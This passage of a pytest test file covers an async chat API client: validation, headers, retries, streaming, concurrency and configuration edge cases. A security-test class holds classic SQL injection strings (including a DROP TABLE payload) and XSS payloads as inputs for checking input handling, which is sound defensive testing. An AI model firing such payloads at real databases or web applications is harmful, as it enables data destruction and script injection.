        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream_with_bad_json()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            try:
                async for chunk in client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                ):
                    chunks.append(chunk)
            except GenesisAPIError:
                pass  # Expected to handle malformed JSON gracefully
            
            # Should have processed at least the first valid chunk
            assert len(chunks) >= 1

    def test_validate_messages_with_mixed_invalid_roles(self, client):
        """Test message validation with a mix of valid and invalid roles."""
        mixed_messages = [
            ChatMessage(role="user", content="Valid message"),
            ChatMessage(role="invalid_role", content="Invalid role"),
            ChatMessage(role="assistant", content="Another valid message"),
            ChatMessage(role="another_invalid", content="Another invalid")
        ]
        
        with pytest.raises(ValidationError, match="Invalid message role"):
            client._validate_messages(mixed_messages)

    def test_validate_messages_with_whitespace_only_content(self, client):
        """Test message validation with whitespace-only content."""
        whitespace_messages = [
            ChatMessage(role="user", content="   "),  # Only spaces
            ChatMessage(role="user", content="\t\n"),  # Only tabs and newlines
        ]
        
        with pytest.raises(ValidationError, match="Message content cannot be empty"):
            client._validate_messages(whitespace_messages)

    def test_validate_model_config_edge_values(self, client):
        """Test model config validation with boundary values."""
        config = ModelConfig(name="test-model")
        
        # Test exact boundary values
        config.temperature = 0.0  # Minimum valid
        client._validate_model_config(config)
        
        config.temperature = 2.0  # Maximum valid
        client._validate_model_config(config)
        
        config.top_p = 0.0  # Minimum valid
        client._validate_model_config(config)
        
        config.top_p = 1.0  # Maximum valid
        client._validate_model_config(config)
        
        config.max_tokens = 1  # Minimum valid
        client._validate_model_config(config)

    def test_validate_model_config_float_precision(self, client):
        """Test model config validation with high precision float values."""
        config = ModelConfig(name="test-model")
        
        # Test values very close to boundaries
        config.temperature = 0.000001  # Very small but valid
        client._validate_model_config(config)
        
        config.temperature = 1.999999  # Very close to maximum but valid
        client._validate_model_config(config)

    @pytest.mark.asyncio
    async def test_list_models_empty_response(self, client):
        """Test list_models when API returns empty model list."""
        mock_response = {
            'object': 'list',
            'data': []
        }
        
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_get.return_value.__aenter__.return_value.status = 200
            
            models = await client.list_models()
            assert len(models) == 0
            assert isinstance(models, list)

    @pytest.mark.asyncio
    async def test_list_models_with_pagination(self, client):
        """Test list_models with paginated response."""
        mock_response = {
            'object': 'list',
            'data': [
                {'id': f'model-{i}', 'object': 'model', 'created': 1677610602}
                for i in range(50)  # Large number of models
            ],
            'has_more': False
        }
        
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_get.return_value.__aenter__.return_value.status = 200
            
            models = await client.list_models()
            assert len(models) == 50

    def test_build_headers_preserves_authorization(self, client):
        """Test that custom headers don't override the Authorization header."""
        malicious_headers = {
            'Authorization': 'Bearer fake-key',
            'X-Custom': 'value'
        }
        
        headers = client._build_headers(malicious_headers)
        
        # Should preserve the client's API key, not the custom one
        assert headers['Authorization'] == f'Bearer {client.api_key}'
        assert headers['X-Custom'] == 'value'

    def test_build_headers_case_sensitivity(self, client):
        """Test header building with case-sensitive header names."""
        custom_headers = {
            'content-type': 'text/plain',  # lowercase
            'AUTHORIZATION': 'Bearer fake',  # uppercase
            'X-Custom-Header': 'value'
        }
        
        headers = client._build_headers(custom_headers)
        
        # Should have both the default Content-Type and the custom one
        assert 'Content-Type' in headers
        assert 'content-type' in headers
        assert headers['Content-Type'] == 'application/json'  # Default
        assert headers['content-type'] == 'text/plain'  # Custom

    @pytest.mark.asyncio
    async def test_session_reuse_across_requests(self, client):
        """Test that the same session is reused across multiple requests."""
        mock_response = {
            'id': 'test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'Test'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            session_before = client.session
            
            await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Test 1")],
                model_config=ModelConfig(name="test-model")
            )
            
            session_after_first = client.session
            
            await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Test 2")],
                model_config=ModelConfig(name="test-model")
            )
            
            session_after_second = client.session
            
            # Session should be the same across requests
            assert session_before is session_after_first
            assert session_after_first is session_after_second

    @pytest.mark.asyncio
    async def test_exponential_backoff_timing(self, client, sample_messages, sample_model_config):
        """Test that retry delays follow exponential backoff pattern."""
        delays = []
        
        async def mock_sleep(delay):
            delays.append(delay)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 500
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Server error'}}
            )
            
            with patch('asyncio.sleep', side_effect=mock_sleep):
                with pytest.raises(GenesisAPIError):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                
                # Verify exponential backoff pattern
                assert len(delays) == client.max_retries
                for i in range(1, len(delays)):
                    assert delays[i] > delays[i-1]  # Each delay should be longer


class TestAdvancedDataModels:
    """Extended tests for data model classes with edge cases."""
    
    def test_chat_message_with_none_values(self):
        """Test ChatMessage creation with None values where allowed."""
        message = ChatMessage(role="user", content="Test", name=None)
        assert message.name is None
        
        # Test that None content should be rejected if validation exists
        with pytest.raises((ValueError, TypeError)):
            ChatMessage(role="user", content=None)

    def test_chat_message_serialization(self):
        """Test ChatMessage can be serialized to dict for API requests."""
        message = ChatMessage(role="user", content="Hello", name="John")
        
        # Assuming there's a to_dict method or similar
        if hasattr(message, 'to_dict'):
            data = message.to_dict()
            assert data['role'] == 'user'
            assert data['content'] == 'Hello'
            assert data['name'] == 'John'
        elif hasattr(message, '__dict__'):
            # Fallback to checking attributes
            assert hasattr(message, 'role')
            assert hasattr(message, 'content')
            assert hasattr(message, 'name')

    def test_model_config_with_extreme_values(self):
        """Test ModelConfig with extreme but valid values."""
        config = ModelConfig(
            name="extreme-test",
            max_tokens=1000000,  # Very large
            temperature=0.0,     # Minimum
            top_p=1.0,          # Maximum
            frequency_penalty=2.0,  # Maximum (if supported)
            presence_penalty=-2.0   # Minimum (if supported)
        )
        
        assert config.max_tokens == 1000000
        assert config.temperature == 0.0
        assert config.top_p == 1.0

    def test_api_response_with_empty_data(self):
        """Test APIResponse creation with empty data."""
        response = APIResponse(
            status_code=204,  # No Content
            data={},
            headers={}
        )
        
        assert response.status_code == 204
        assert response.data == {}
        assert response.headers == {}

    def test_chat_completion_with_minimal_data(self):
        """Test ChatCompletion creation with minimal required data."""
        completion = ChatCompletion(
            id="minimal-test",
            object="chat.completion",
            created=0,
            model="test-model",
            choices=[],
            usage={}
        )
        
        assert completion.id == "minimal-test"
        assert len(completion.choices) == 0
        assert completion.usage == {}


class TestAdvancedExceptionHandling:
    """Extended tests for exception handling and error conditions."""
    
    def test_genesis_api_error_with_none_status_code(self):
        """Test GenesisAPIError when status_code is None."""
        error = GenesisAPIError("Error without status code", status_code=None)
        assert str(error) == "Error without status code"
        assert error.status_code is None

    def test_rate_limit_error_with_invalid_retry_after(self):
        """Test RateLimitError with invalid retry_after values."""
        # Test with negative retry_after
        error = RateLimitError("Rate limited", retry_after=-1)
        assert error.retry_after == -1  # Should store as-is
        
        # Test with very large retry_after
        error = RateLimitError("Rate limited", retry_after=999999)
        assert error.retry_after == 999999

    def test_exception_inheritance_chain(self):
        """Test that all custom exceptions inherit correctly."""
        auth_error = AuthenticationError("Auth failed")
        rate_error = RateLimitError("Rate limited")
        validation_error = ValidationError("Validation failed")
        
        # All should inherit from GenesisAPIError
        assert isinstance(auth_error, GenesisAPIError)
        assert isinstance(rate_error, GenesisAPIError)
        assert isinstance(validation_error, GenesisAPIError)
        
        # And ultimately from Exception
        assert isinstance(auth_error, Exception)
        assert isinstance(rate_error, Exception)
        assert isinstance(validation_error, Exception)


class TestAdvancedUtilityFunctions:
    """Extended tests for utility functions with edge cases."""
    
    def test_format_timestamp_edge_cases(self):
        """Test timestamp formatting with edge case values."""
        from app.ai_backend.genesis_api import format_timestamp
        
        # Test with zero timestamp
        formatted = format_timestamp(0)
        assert isinstance(formatted, str)
        
        # Test with very large timestamp
        large_timestamp = 9999999999
        formatted = format_timestamp(large_timestamp)
        assert isinstance(formatted, str)
        
        # Test with negative timestamp (if supported)
        try:
            formatted = format_timestamp(-1)
            assert isinstance(formatted, str)
        except (ValueError, OSError):
            pass  # May not be supported on all systems

    def test_calculate_token_usage_empty_messages(self):
        """Test token usage calculation with empty message list."""
        from app.ai_backend.genesis_api import calculate_token_usage
        
        usage = calculate_token_usage([])
        assert isinstance(usage, dict)
        assert usage.get('estimated_tokens', 0) == 0

    def test_calculate_token_usage_large_messages(self):
        """Test token usage calculation with very large messages."""
        from app.ai_backend.genesis_api import calculate_token_usage
        
        large_messages = [
            ChatMessage(role="user", content="x" * 10000),
            ChatMessage(role="assistant", content="y" * 5000)
        ]
        
        usage = calculate_token_usage(large_messages)
        assert isinstance(usage, dict)
        assert 'estimated_tokens' in usage
        assert usage['estimated_tokens'] > 0

    @pytest.mark.parametrize("content,min_tokens,max_tokens", [
        ("", 0, 1),
        ("x" * 1000, 100, 1500),  # Range for very long text
        ("Hello world! 123 @#$", 2, 10),  # Mixed content
        ("🚀💖🌍", 1, 10),  # Emojis
    ])
    def test_estimate_tokens_ranges(self, content, min_tokens, max_tokens):
        """Test token estimation returns reasonable ranges for various content types."""
        from app.ai_backend.genesis_api import estimate_tokens
        
        tokens = estimate_tokens(content)
        assert min_tokens <= tokens <= max_tokens
        assert isinstance(tokens, int)

    def test_estimate_tokens_consistency(self):
        """Test that token estimation is consistent for the same input."""
        from app.ai_backend.genesis_api import estimate_tokens
        
        content = "This is a test message for consistency checking."
        
        # Call multiple times and ensure consistent results
        results = [estimate_tokens(content) for _ in range(5)]
        assert all(r == results[0] for r in results)


class TestAdvancedIntegration:
    """Extended integration tests for complex workflows."""
    
    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_full_conversation_simulation(self):
        """Test a complete multi-turn conversation simulation."""
        config = {'api_key': 'test-key'}
        
        conversation_responses = [
            {
                'id': 'conv-1',
                'choices': [{'message': {'role': 'assistant', 'content': 'Hello! How can I help?'}}],
                'usage': {'total_tokens': 15}
            },
            {
                'id': 'conv-2', 
                'choices': [{'message': {'role': 'assistant', 'content': 'I can help with that!'}}],
                'usage': {'total_tokens': 25}
            },
            {
                'id': 'conv-3',
                'choices': [{'message': {'role': 'assistant', 'content': 'Anything else?'}}],
                'usage': {'total_tokens': 35}
            }
        ]
        
        call_count = 0
        
        async def mock_post_conversation(*args, **kwargs):
            nonlocal call_count
            response = Mock()
            response.status = 200
            response.json = AsyncMock(return_value=conversation_responses[call_count])
            call_count += 1
            return response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_conversation):
            async with GenesisAPIClient(**config) as client:
                conversation = []
                
                # Turn 1
                conversation.append(ChatMessage(role="user", content="Hello"))
                result1 = await client.create_chat_completion(
                    messages=conversation.copy(),
                    model_config=ModelConfig(name="test-model")
                )
                conversation.append(ChatMessage(
                    role="assistant", 
                    content=result1.choices[0].message.content
                ))
                
                # Turn 2
                conversation.append(ChatMessage(role="user", content="I need help"))
                result2 = await client.create_chat_completion(
                    messages=conversation.copy(),
                    model_config=ModelConfig(name="test-model")
                )
                conversation.append(ChatMessage(
                    role="assistant",
                    content=result2.choices[0].message.content
                ))
                
                # Turn 3
                conversation.append(ChatMessage(role="user", content="Thanks"))
                result3 = await client.create_chat_completion(
                    messages=conversation.copy(),
                    model_config=ModelConfig(name="test-model")
                )
                
                assert len(conversation) == 5  # 3 user + 2 assistant messages
                assert result1.id == 'conv-1'
                assert result2.id == 'conv-2'
                assert result3.id == 'conv-3'

    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_streaming_conversation_workflow(self):
        """Test a streaming conversation with multiple chunks per response."""
        config = {'api_key': 'test-key'}
        
        # Simulate streaming chunks for a complete response
        mock_chunks = [
            {'choices': [{'delta': {'role': 'assistant'}}]},
            {'choices': [{'delta': {'content': 'I'}}]},
            {'choices': [{'delta': {'content': ' can'}}]},
            {'choices': [{'delta': {'content': ' help'}}]},
            {'choices': [{'delta': {'content': ' you'}}]},
            {'choices': [{'delta': {'content': ' with'}}]},
            {'choices': [{'delta': {'content': ' that!'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                full_content = ""
                chunk_count = 0
                
                async for chunk in client.create_chat_completion_stream(
                    messages=[ChatMessage(role="user", content="Help me")],
                    model_config=ModelConfig(name="test-model")
                ):
                    chunk_count += 1
                    if hasattr(chunk.choices[0], 'delta') and hasattr(chunk.choices[0].delta, 'content'):
                        if chunk.choices[0].delta.content:
                            full_content += chunk.choices[0].delta.content
                
                assert chunk_count == len(mock_chunks)
                assert full_content == "I can help you with that!"


class TestAdvancedPerformance:
    """Extended performance and stress tests."""
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_memory_usage_with_large_responses(self):
        """Test memory efficiency with very large API responses."""
        config = {'api_key': 'test-key'}
        
        # Create a very large mock response
        large_content = "x" * 100000  # 100KB of content
        mock_response = {
            'id': 'large-response-test',
            'choices': [{'message': {'content': large_content}}],
            'usage': {'total_tokens': 25000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                result = await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="Generate large text")],
                    model_config=ModelConfig(name="test-model", max_tokens=30000)
                )
                
                assert len(result.choices[0].message.content) == 100000
                assert result.usage.total_tokens == 25000

    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_rapid_sequential_requests(self):
        """Test rapid sequential API requests without concurrency."""
        config = {'api_key': 'test-key'}
        
        mock_response = {
            'id': 'sequential-test',
            'choices': [{'message': {'content': 'Sequential response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                start_time = datetime.now()
                
                results = []
                for i in range(20):  # 20 rapid sequential requests
                    result = await client.create_chat_completion(
                        messages=[ChatMessage(role="user", content=f"Request {i}")],
                        model_config=ModelConfig(name="test-model")
                    )
                    results.append(result)
                
                end_time = datetime.now()
                duration = (end_time - start_time).total_seconds()
                
                assert len(results) == 20
                assert all(r.id == 'sequential-test' for r in results)
                # Verify it completed in reasonable time (adjust threshold as needed)
                assert duration < 10  # Should complete in under 10 seconds

    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_streaming_performance_with_many_chunks(self):
        """Test streaming performance with a large number of small chunks."""
        config = {'api_key': 'test-key'}
        
        # Generate many small chunks
        mock_chunks = []
        for i in range(1000):  # 1000 small chunks
            mock_chunks.append({'choices': [{'delta': {'content': f'{i}'}}]})
        mock_chunks.append({'choices': [{'delta': {}, 'finish_reason': 'stop'}]})
        
        async def mock_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                start_time = datetime.now()
                
                chunk_count = 0
                async for chunk in client.create_chat_completion_stream(
                    messages=[ChatMessage(role="user", content="Generate many chunks")],
                    model_config=ModelConfig(name="test-model")
                ):
                    chunk_count += 1
                
                end_time = datetime.now()
                duration = (end_time - start_time).total_seconds()
                
                assert chunk_count == 1001  # 1000 content chunks + 1 finish chunk
                # Verify reasonable processing time
                assert duration < 5  # Should process 1000 chunks in under 5 seconds


# Test configuration and framework validation
class TestFrameworkConfiguration:
    """Tests to validate the testing framework and configuration."""
    
    def test_pytest_framework_available(self):
        """Verify that pytest is the testing framework in use."""
        import pytest
        assert pytest.__version__ is not None
        # This test confirms we're using pytest as the testing framework
    
    def test_asyncio_support_available(self):
        """Verify that asyncio testing support is properly configured."""
        import asyncio
        
        # Test that we can create and run async functions
        async def dummy_async():
            await asyncio.sleep(0.001)
            return True
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(dummy_async())
            assert result is True
        finally:
            loop.close()
    
    def test_mock_libraries_available(self):
        """Verify that all required mocking libraries are available."""
        from unittest.mock import Mock, patch, AsyncMock, MagicMock
        
        # Test that we can create different types of mocks
        mock = Mock()
        async_mock = AsyncMock()
        magic_mock = MagicMock()
        
        assert mock is not None
        assert async_mock is not None
        assert magic_mock is not None
        
        # Test basic patching functionality
        with patch('builtins.print') as mock_print:
            print("test")
            mock_print.assert_called_once_with("test")


if __name__ == "__main__":
    # Extended test runner configuration
    pytest.main([
        __file__, 
        "-v", 
        "--tb=short",
        "--maxfail=5",  # Stop after 5 failures
        "--disable-warnings",  # Reduce noise in output
        "-x"  # Stop on first failure for debugging
    ])

# ============================================================================
# ADDITIONAL COMPREHENSIVE TEST COVERAGE
# ============================================================================

class TestSecurityAndInputValidation:
    """Security-focused tests for input validation and sanitization."""
    
    @pytest.fixture
    def client(self):
        """Provide a basic client for security tests."""
        return GenesisAPIClient(api_key='test-security-key')
    
    def test_api_key_sanitization_in_logs(self, client):
        """Test that API keys are not exposed in string representations."""
        client_str = str(client)
        client_repr = repr(client)
        
        # API key should not appear in string representations
        assert 'test-security-key' not in client_str
        assert 'test-security-key' not in client_repr
        
        # Should have some form of masking
        assert '***' in client_str or '[REDACTED]' in client_str or 'test-security-key' not in client_str
    
    def test_sql_injection_in_message_content(self, client):
        """Test that SQL injection attempts in message content are handled safely."""
        malicious_messages = [
            ChatMessage(role="user", content="'; DROP TABLE users; --"),
            ChatMessage(role="user", content="1' OR '1'='1"),
            ChatMessage(role="user", content="UNION SELECT * FROM passwords"),
        ]
        
        # Should validate without raising security-related exceptions
        try:
            client._validate_messages(malicious_messages)
        except ValidationError:
            pass  # Expected for content validation
        except Exception as e:
            # Should not raise unexpected security exceptions
            assert "SQL" not in str(e).upper()
            assert "INJECTION" not in str(e).upper()
    
    def test_xss_attempts_in_message_content(self, client):
        """Test handling of XSS attempts in message content."""
        xss_messages = [
            ChatMessage(role="user", content="<script>alert('xss')</script>"),
            ChatMessage(role="user", content="javascript:alert('xss')"),
            ChatMessage(role="user", content="<img src=x onerror=alert('xss')>"),
        ]
        
        # Should validate without executing or being vulnerable to XSS
        try:
            client._validate_messages(xss_messages)
        except ValidationError:
            pass  # May be rejected by content validation
        # Should not execute any script content or raise script-related errors
    
    def test_extremely_long_api_key(self):
        """Test handling of extremely long API keys."""
        very_long_key = "x" * 10000
        
        # Should handle gracefully without memory issues
        client = GenesisAPIClient(api_key=very_long_key)
        assert client.api_key == very_long_key
    
    def test_unicode_normalization_attacks(self, client):
        """Test handling of Unicode normalization attacks in message content."""
        unicode_attack_messages = [
            ChatMessage(role="user", content="admin\u0000"),  # Null byte
            ChatMessage(role="user", content="test\uFEFF"),   # Zero-width no-break space
            ChatMessage(role="user", content="test\u200B"),   # Zero-width space
            ChatMessage(role="user", content="test\u202E"),   # Right-to-left override
        ]
        
        try:
            client._validate_messages(unicode_attack_messages)
        except ValidationError:
            pass  # May be rejected by validation
        # Should handle Unicode normalization safely
    
    def test_binary_data_in_content(self, client):
        """Test handling of binary data in message content."""
        binary_content = b'\x00\x01\x02\xFF'.decode('latin1')
        binary_messages = [
            ChatMessage(role="user", content=binary_content)
        ]
        
        with pytest.raises(ValidationError):
            client._validate_messages(binary_messages)


class TestAdvancedAsyncBehavior:
    """Tests for advanced asynchronous behavior and edge cases."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-async-key')
    
    @pytest.mark.asyncio
    async def test_concurrent_session_usage(self, client):
        """Test that concurrent operations on the same session work correctly."""
        mock_response = {
            'id': 'concurrent-session-test',
            'choices': [{'message': {'content': 'Concurrent response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Create multiple concurrent operations
            async def make_request(i):
                return await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content=f"Request {i}")],
                    model_config=ModelConfig(name="test-model")
                )
            
            # Run multiple requests concurrently
            tasks = [make_request(i) for i in range(5)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # All should succeed
            assert len(results) == 5
            assert all(not isinstance(r, Exception) for r in results)
    
    @pytest.mark.asyncio
    async def test_session_cleanup_on_exception(self, client):
        """Test that sessions are properly cleaned up when exceptions occur."""
        with patch('aiohttp.ClientSession.post', side_effect=Exception("Simulated error")):
            initial_session = client.session
            
            with pytest.raises(Exception):
                await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="Test")],
                    model_config=ModelConfig(name="test-model")
                )
            
            # Session should still be accessible for cleanup
            assert client.session is initial_session
    
    @pytest.mark.asyncio
    async def test_async_context_manager_nested_usage(self):
        """Test nested async context manager usage patterns."""
        config = {'api_key': 'test-nested-key'}
        
        async with GenesisAPIClient(**config) as outer_client:
            outer_session = outer_client.session
            
            # Nested usage should work
            async with GenesisAPIClient(**config) as inner_client:
                inner_session = inner_client.session
                
                # Should be different instances
                assert outer_client is not inner_client
                assert outer_session is not inner_session
            
            # Inner client should be closed, outer should still be open
            assert inner_client.session.closed
            assert not outer_client.session.closed
    
    @pytest.mark.asyncio
    async def test_cancellation_handling(self, client):
        """Test proper handling of task cancellation."""
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Create a long-running mock that we can cancel
            async def slow_response(*args, **kwargs):
                await asyncio.sleep(10)  # Long delay
                mock_response = Mock()
                mock_response.json = AsyncMock(return_value={'id': 'test'})
                mock_response.status = 200
                return mock_response
            
            mock_post.side_effect = slow_response
            
            # Start the request
            task = asyncio.create_task(client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Test")],
                model_config=ModelConfig(name="test-model")
            ))
            
            # Cancel it quickly
            await asyncio.sleep(0.1)
            task.cancel()
            
            # Should raise CancelledError
            with pytest.raises(asyncio.CancelledError):
                await task


class TestAdvancedErrorScenarios:
    """Tests for complex error scenarios and recovery patterns."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-error-key', max_retries=2)
    
    @pytest.mark.asyncio
    async def test_mixed_error_sequence(self, client, sample_messages, sample_model_config):
        """Test handling of different error types in sequence."""
        error_sequence = [
            (500, {'error': {'message': 'Server error'}}),
            (429, {'error': {'message': 'Rate limited'}}),
            (200, {
                'id': 'success-after-errors',
                'choices': [{'message': {'content': 'Finally worked'}}],
                'usage': {'total_tokens': 15}
            })
        ]
        
        call_count = 0
        
        async def mock_post_sequence(*args, **kwargs):
            nonlocal call_count
            status, response_data = error_sequence[call_count]
            call_count += 1
            
            mock_response = Mock()
            mock_response.status = status
            mock_response.json = AsyncMock(return_value=response_data)
            if status == 429:
                mock_response.headers = {'Retry-After': '1'}
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_sequence):
            with patch('asyncio.sleep'):  # Speed up retries
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert result.id == 'success-after-errors'
                assert call_count == 3  # Should have retried through all errors
    
    @pytest.mark.asyncio
    async def test_error_with_missing_error_message(self, client, sample_messages, sample_model_config):
        """Test handling of error responses without proper error message structure."""
        malformed_errors = [
            {},  # Empty response
            {'error': {}},  # Empty error object
            {'error': {'code': 400}},  # Missing message
            {'message': 'Error outside error object'},  # Wrong structure
        ]
        
        for malformed_error in malformed_errors:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.status = 400
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=malformed_error)
                
                with pytest.raises(GenesisAPIError):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
    
    @pytest.mark.asyncio
    async def test_response_timeout_during_json_parsing(self, client, sample_messages, sample_model_config):
        """Test timeout occurring during JSON response parsing."""
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 200
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=asyncio.TimeoutError("JSON parsing timeout")
            )
            
            with pytest.raises(GenesisAPIError, match="Request timeout"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )


class TestAdvancedConfigurationScenarios:
    """Tests for advanced configuration and edge cases."""
    
    def test_zero_timeout_configuration(self):
        """Test configuration with zero timeout (should be invalid)."""
        with pytest.raises(ValueError, match="Timeout must be positive"):
            GenesisAPIClient(api_key='test-key', timeout=0)
    
    def test_fractional_timeout_configuration(self):
        """Test configuration with fractional timeout values."""
        client = GenesisAPIClient(api_key='test-key', timeout=0.5)
        assert client.timeout == 0.5
        
        client = GenesisAPIClient(api_key='test-key', timeout=1.25)
        assert client.timeout == 1.25
    
    def test_very_large_configuration_values(self):
        """Test configuration with very large values."""
        client = GenesisAPIClient(
            api_key='test-key',
            timeout=999999,
            max_retries=100
        )
        assert client.timeout == 999999
        assert client.max_retries == 100
    
    def test_custom_base_url_with_trailing_slash(self):
        """Test base URL configuration with trailing slash."""
        client = GenesisAPIClient(
            api_key='test-key',
            base_url='https://api.example.com/v1/'
        )
        # Should handle trailing slash appropriately
        assert client.base_url.endswith('v1') or client.base_url.endswith('v1/')
    
    def test_base_url_without_protocol(self):
        """Test base URL configuration without protocol."""
        with pytest.raises((ValueError, TypeError)):
            GenesisAPIClient(
                api_key='test-key',
                base_url='api.example.com/v1'
            )
    
    def test_empty_string_configurations(self):
        """Test configurations with empty strings."""
        with pytest.raises(ValueError):
            GenesisAPIClient(api_key='')
        
        with pytest.raises((ValueError, TypeError)):
            GenesisAPIClient(api_key='test-key', base_url='')


class TestAdvancedStreamingScenarios:
    """Advanced tests for streaming functionality."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-streaming-key')
    
    @pytest.mark.asyncio
    async def test_streaming_with_empty_chunks(self, client, sample_messages, sample_model_config):
        """Test streaming with empty or whitespace-only chunks."""
        mock_chunks = [
            '',  # Empty chunk
            '   ',  # Whitespace-only chunk
            json.dumps({'choices': [{'delta': {'content': 'Real content'}}]}),
            '\n\n',  # More whitespace
            json.dumps({'choices': [{'delta': {}, 'finish_reason': 'stop'}]})
        ]
        
        async def mock_stream():
            for chunk in mock_chunks:
                yield chunk.encode() if chunk else b''
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            # Should have processed valid chunks while skipping empty ones
            assert len(chunks) >= 1
    
    @pytest.mark.asyncio
    async def test_streaming_with_very_large_chunks(self, client, sample_messages, sample_model_config):
        """Test streaming with very large individual chunks."""
        large_content = "x" * 50000  # 50KB chunk
        mock_chunks = [
            {'choices': [{'delta': {'content': large_content}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            assert len(chunks) == 2
            assert len(chunks[0].choices[0].delta.content) == 50000
    
    @pytest.mark.asyncio
    async def test_streaming_chunk_boundary_issues(self, client, sample_messages, sample_model_config):
        """Test streaming with JSON chunks split across boundaries."""
        # Simulate JSON being split across chunk boundaries
        partial_json = '{"choices": [{"delta": {"con'
        remaining_json = 'tent": "Split message"}}]}'
        
        async def mock_stream():
            yield partial_json.encode()
            yield remaining_json.encode()
            yield json.dumps({'choices': [{'delta': {}, 'finish_reason': 'stop'}]}).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            try:
                async for chunk in client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                ):
                    chunks.append(chunk)
            except GenesisAPIError:
                pass  # May fail due to invalid JSON chunks
            
            # Test should handle partial JSON gracefully


class TestBoundaryValueAnalysis:
    """Comprehensive boundary value analysis for all parameters."""
    
    @pytest.fixture
    def client(self):
